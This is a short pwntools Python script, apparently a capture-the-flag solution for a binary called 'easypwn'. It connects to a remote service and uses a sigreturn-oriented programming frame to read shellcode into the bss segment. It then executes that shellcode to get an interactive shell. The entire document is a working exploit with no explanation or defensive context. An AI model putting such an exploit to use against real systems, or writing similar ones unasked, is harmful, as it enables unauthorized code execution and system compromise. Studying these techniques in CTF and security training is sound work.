from pwn import *
import time

context.clear()
context.arch = "amd64" # Architecture
context.log_level = "debug"

#io = remote('127.0.0.1', 2234)
io = remote('10.139.0.73', 2234)
#io = process("./easypwn")

syscall = 0x40008E
bss = 0x400100

## read(0, bss, 0x400)
frame = SigreturnFrame()
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x400
frame.rsp = bss
frame.rip = syscall
io.send(str(frame))

time.sleep(0.2)

# exec in bss+8
payload = p64(bss+8)+asm(shellcraft.sh())
io.send(payload)
io.interactive()
